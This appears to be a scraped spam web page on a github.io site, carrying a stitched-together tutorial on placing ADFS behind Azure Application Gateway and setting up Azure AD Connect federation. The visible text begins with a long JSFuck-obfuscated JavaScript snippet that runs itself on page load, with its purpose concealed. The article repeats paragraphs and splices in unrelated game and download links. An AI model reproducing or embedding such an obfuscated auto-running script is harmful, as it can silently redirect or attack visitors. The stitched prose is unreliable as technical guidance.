+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([]+[]+{})[+!+[]]+(![]+[])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$fHk[17]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+$fHk[36]+$fHk[33]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[18]+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+(+{}+[]+[]+[]+[]+{})[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+([]+[]+{})[+!+[]]+([![]]+{})[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]]+$fHk[45]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+(!![]+[])[+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[32]+(!![]+[])[+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([]+[]+{})[+!+[]]+([]+[]+[][[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+$fHk[33]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[12]+$fHk[+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+$fHk[32]+(!![]+[])[+!+[]]+$fHk[35]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[]+[][[]])[+!+[]]+([]+[]+[][[]])[!+[]+!+[]]+$fHk[36]+$fHk[33]+$fHk[12])();</script><ul><li><a href='#availability-sets'>Availability Sets</a></li><li><a href='#azure-application-gateway-adfs'>Azure Application Gateway Adfs</a></li></ul><p>Some time ago i wrote up a post (located here) explaining how you can setup traffic manager with ADFS and have proper monitoring of the service. Today i will go over how to setup ADFS behind the Azure Application Gateway. This will enable you to protect your ADFS service and monitor it with the WAF provided by the application gateway.</p><ol><li>AD FS provides simplified, secured identity federation and Web single sign-on (SSO) capabilities. Federation with Azure AD enables users to authenticate using on-premises credentials and access all resources in cloud. As a result, it becomes important to have a highly available AD FS infrastructure to ensure access to resources both on-premises and in the cloud.</li><li>In Part 1 of Configuring Azure Application Gateway with AD FS we covered the existing architecture AD FS and the target AD FS architecture. Finally we deployed an Application Gateway with a basic configuration. So lets have a look at the logical configuration of what AD FS with a Application Gateway running a Web Application.</li></ol><p>Before we begin one prerequisite which i am still not sure if its really needed but i had problems and i believe this fixed it:</p><p>You need to set the default HTTPS Binding, i believe this is required as i am not sure if the health probe is truly SNI compliant, i might be wrong here but it doesn’t hurt to set this. To set it you simply need to run the following command on the WAP servers (just change the cert hash):</p><p>Application Gateway will fail the request if response is not received within RequestTimeout. Create instance of Application Gateway azure. The Azure Application Proxy supports a number of application types: Web applications that use Integrated Windows Authentication for authentication. Web applications that use form-based or header-based access. Web APIs that you want to expose to rich applications on different devices. Applications hosted behind a Remote Desktop Gateway.</p><div><textarea wrap='soft' readonly='>netsh http add sslcert ipport=0.0.0.0:443 certhash=xxxxxxxxxxxxxx appid={5d89a20c-beab-4389-9447-324788eb944a}</textarea></div><table><tbody><tr><td><div><span>netsh </span><span>http </span><span>add </span><span>sslcert </span><span>ipport</span><span>=</span><span>0.0.0.0</span><span>:</span><span>443</span><span>certhash</span><span>=</span><span>xxxxxxxxxxxxxx </span><span>appid</span><span>=</span><span>{</span><span>5d89a20c</span><span>-</span><span>beab</span><span>-</span><span>4389</span><span>-</span><span>9447</span><span>-</span><span>324788eb944a</span><span>}</span></div></td></tr></tbody></table><p>Ones that’s done create a Application gateway in Azure and do the following:</p><ol><li>Create a Frontend listener with thew following settings:<ul><li>HTTPS Protocol</li><li>Listen on port 443</li><li>Multi-Site type, you can do basic but that will limit your application gateway to only the ADFS service for port 443</li><li>Provide a PFX file of your ADFS certificate. make sure you include the private key and a strong password</li></ul></li><li>Create a Health Probe with thew following settings (just change the host):<ul><li>The path (so you can copy and paste): /adfs/ls/IdpInitiatedSignOn.aspx</li></ul></li><li>Create a HTTP Setting with thew following settings<ul><li>HTTPS Protocol</li><li>Cookie based affinity: Disabled (you really don’t need that for ADFS)</li><li>Port 443</li><li>Export your ADFS certificate as a base 64 format (do not include the private key) and add it.</li><li>Tick the “Custom probe” and select the probe we created earlier</li></ul></li><li>Create a Backendpool which includes all your WAP servers</li><li>Crete a Basic Rule using the objects created earlier.</li></ol><p>And that’s it, this is not only a secure solution but it will give you a proper monitoring of both the WAP and ADFS servers. Works great with loadbalancing between on-prem and Azure.</p><p>AD FS provides simplified, secured identity federation and Web single sign-on (SSO) capabilities. Federation with Azure AD enables users to authenticate using on-premises credentials and access all resources in cloud. As a result, it becomes important to have a highly available AD FS infrastructure to ensure access to resources both on-premises and in the cloud.</p><h2>Introducing Federation with Azure AD</h2><img src=' https://i0.wp.com/blog.apps.id.au/wp-content/uploads/2018/04/aag-topology.jpg?fit="1378%2C700&ssl=1'" alt='Azure Application Gateway Adfs' title='Azure Application Gateway Adfs'></textarea><p>Federation is a collection of domains that have established trust. The level of trust may vary, but typically includes authentication and almost always includes authorization. <br>We can federate your on-premises environment with Azure AD and use this federation for authentication and authorization. This sign-in method ensures that all user authentication occurs on-premises. This method allows administrators to implement more rigorous levels of access control.</p><h2>Architectural Diagram</h2><p>If we need highly available Federation, then we have to set up “password hash synchronization” option as a backup in case ADFS infrastructure fails. </p><cite><br></cite><h2><strong>ADFS configuration prerequisites</strong></h2><ul><li><strong>Windows Remote Management</strong></li></ul><img src='https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-introduction/scenario.png' alt='Azure Application Gateway Adfs' title='Azure Application Gateway Adfs'><p>If the target server is domain joined, then ensure that Windows Remote Managed is enabled<br>In an elevated PS command window, use command<br></p><p>Enable-PSRemoting –Force</p><ul><li><strong>SSL Certificate</strong></li></ul><p>It’s strongly recommended to use the same SSL certificate across all nodes of your AD FS farm and all Web Application proxy servers. The certificate must be an X509 certificate.<br>You can use a self-signed certificate on federation servers in a test lab environment. However, for a production environment, I recommend that you obtain the certificate from a public CA</p><p>The identity of the certificate must match the federation service name <strong>(for example, sts.contoso.com)</strong></p><p><a href='/borderlands-2-assassin-madness-pack-for-mac.html'><img src='https://steamcdn-a.akamaihd.net/steam/apps/225829/capsule_616x353.jpg?t=1545234310' alt='Borderlands 2: assassin madness pack for mac'></a></p><ul><li><strong>Name resolution for federation servers</strong></li></ul><p>Set up DNS records for the AD FS federation service name (for example sts.contoso.com) for both the intranet (your internal DNS server) and the extranet (public DNS through your domain registrar). For the intranet DNS record, ensure that you use A records and not CNAME records. This is required for windows authentication to work correctly from your domain joined machine.</p><p>After configure the prerequisites, next we install Azure AD Connect tool. </p><h2>Installation of Azure AD Connect</h2><p>Download Microsoft Azure Active Directory Connect from here</p><ul><li>Sign in as a local administrator to the server you wish to install Azure AD Connect on. You should do this on the server you wish to be the sync server.</li><li>Navigate to and double-click AzureADConnect.msi.</li><li>On the Welcome screen, select the box agreeing to the licensing terms and click Continue.</li><li>On the Express settings screen, click Use Customize settings.</li></ul><p><strong>Installrequired components </strong></p><p>When you install the synchronization services, you can leave the optional configuration section unchecked and Azure AD Connect sets up everything automatically. It sets up a SQL Server 2012 Express LocalDB instance, create the appropriate groups, and assign permissions.</p><p><strong>User sign-in</strong></p><img src='https://docs.microsoft.com/en-us/azure/application-gateway/media/application-gateway-url-route-overview/figure1.png' alt='Azure Application Gateway Adfs' title='Azure Application Gateway Adfs'><p>After installing the required components, you are asked to select your user’s single sign-on method. In our case, we’ll select Federation with ADFS. </p><p><strong>Connect toAzure AD</strong></p><img src='https://i2.wp.com/msandbu.org/wp-content/uploads/2017/06/image.png' alt='Application' title='Application'><p>On the Connect to Azure AD screen, enter a global admin account and password.</p><p><strong>Connect yourdirectories</strong></p><p>To connect to your Active Directory Domain Service, Azure AD Connect needs the forest name and credentials of an account with sufficient permissions.</p><p>After entering the forest name and clicking <strong>Add Directory</strong>, a pop-up dialog appears and prompts to create a new account or use existing account required by Azure AD Connect for connecting to the AD forest during directory synchronization.</p><p><strong>Azure ADsign-in configuration</strong></p><p>This page allows you to review the UPN domains present in on-premises AD DS and which have been verified in Azure AD. This page also allows you to configure the attribute to use for the userPrincipalName.</p><p><strong>Domain and OU filtering</strong></p><p>By default all domains and OUs are synchronized. If there are some domains or OUs you do not want to synchronize to Azure AD, you can unselect these domains and OUs.</p><p><strong>Uniquely identifying your users</strong></p><p>The Matching across forests feature allows you to define how users from your AD DS forests are represented in Azure AD. A user might either be represented only once across all forests or have a combination of enabled and disabled accounts. The user might also be represented as a contact in some forests. </p><p><strong>Sync filtering based on groups</strong></p><p>The filtering on groups feature allows you to sync only a small subset of objects for a pilot. To use this feature, create a group for this purpose in your on-premises Active Directory. Then add users and groups that should be synchronized to Azure AD as direct members. You can later add and remove users to this group to maintain the list of objects that should be present in Azure AD. All objects you want to synchronize must be a direct member of the group. Users, groups, contacts, and computers/devices must all be direct members. Nested group membership is not resolved. When you add a group as a member, only the group itself is added and not its members.</p><p><strong>Optional Features</strong></p><p>This screen allows you to select the optional features for your specific scenarios. </p><p><strong>Create a new ADFS farm or use an existing ADFS farm</strong></p><h2 id='availability-sets'>Availability Sets</h2><p>You can use an existing AD FS farm or you can choose to create a new AD FS farm. If you choose to create a new one, you are required to provide the SSL certificate. If the SSL certificate is protected by a password, you are prompted for the password. </p><p><strong>Specify the ADFS Servers</strong></p><p>Enter the servers that you want to install ADFS on.</p><p><strong> Specify the service account for the ADFS service</strong></p><p>The AD FS service requires a domain service account to authenticate users and lookup user information in Active Directory. </p><p><strong>Select the Azure AD domain that you wish to federate</strong></p><p>This configuration is used to setup the federation relationship between AD FS and Azure AD. It configures ADFS to issue security tokens to Azure AD and configures Azure AD to trust the tokens from this specific ADFS instance. This page only allows you to configure a single domain in the initial installation. You can configure more domains later by running Azure AD Connect again. </p><p><strong>Verify the Azure AD domain selected for federation</strong></p><p>When you select the domain to be federated, Azure AD Connect provides you with necessary information to verify an unverified domain. See Add and verify the domain for how to use this information.</p><p><strong>Configure and verify pages</strong></p><p>Select start the synchronization as soon as possible.</p><p><strong>Verify your federation configuration</strong></p><p>Azure AD Connect verifies the DNS settings for you when you click the Verify button.</p><p>In addition, perform the following verification steps:</p><h2 id='azure-application-gateway-adfs'>Azure Application Gateway Adfs</h2><ul><li>Validate that you can sign in from a browser from a domain joined machine on the intranet: Connect to https://myapps.microsoft.com and verify the sign-in with your logged in account. The built-in ADDS administrator account is not synchronized and cannot be used for verification.</li><li>Validate that you can sign in from a device from the extranet. On a home machine or a mobile device, connect to https://myapps.microsoft.com and supply your credentials.</li><li>Validate rich client sign-in. Connect to https://testconnectivity.microsoft.com, choose the <strong>Office 365</strong> tab and chose the <strong>Office 365 Single Sign-On Test</strong></li></ul></div></div><footer class="md-post-panel"></footer></article><nav role="navigation" id="list-extra-top" class="bar-top-md"><h1 class="panel-site-primary">Post navigation</h1><div class="fix nav-extra-primary"><a href="/no-boot-sector-on-usb-device.html">No Boot Sector On Usb Device</a></div><div class="navigation-aside-secondary fix"><a href="/sj-html5-audio-player.html">Sj Html5 Audio Player</a></div></nav></main></div><div id="static-label-area" class="panel-default-page clear page-clear-md" role="complementary"><aside id="sm-row-label" class="layout-md-fn post-box-item"><div class="sm-row-label-inner-block"><form role="search" method="get" class="layout-item-single page-block-layout" action="#"><label><span class="panel-site-primary">Search for:</span><input type="search" class="sm-layout-node" placeholder="Search &hellip;" value="" name="s"></label><input type="submit" class="label-abbr-fix" value="Search"></form></div></aside><aside id="aside-clear-main" class="md-label-area post-box-item"><div class="aside-clear-main-inner-block"><h1 class="fix-aside-entry">Recent News</h1><ul>&#167; <a href='/elements-of-workshop-technology-by-hajra-choudhary-pdf-printer.html'>Elements Of Workshop Technology By Hajra Choudhary Pdf Printer</a></ul><ul>&#167; <a href='/sachse-100-etudes-pdf-free.html'>Sachse 100 Etudes Pdf Free</a></ul><ul>&#167; <a href='/briggs-and-stratton-quantum-repair-manual.html'>Briggs And Stratton Quantum Repair Manual</a></ul><ul>&#167; <a href='/ed-seykota-trading-tribe-book-pdf.html'>Ed Seykota Trading Tribe Book Pdf</a></ul><ul>&#167; <a href='/one-piece-marineford-war-sub-indo.html'>One Piece Marineford War Sub Indo</a></ul></div></aside></div></div><footer id="col-md-body" class="container-lg-layout layout-item-single copy-md-default" role="contentinfo"><div id="layout-fn-singular" class="static-panel-abbr solid"><div class="layout-fn-singular-inner-block"></div></div><div class="node-layer-fn default-layer-panel"><div class="node-layer-fn-inner-block"><a href="/" title="chancdenthera1973.github.io">chancdenthera1973.github.io</a></div></div></footer></div></body></html>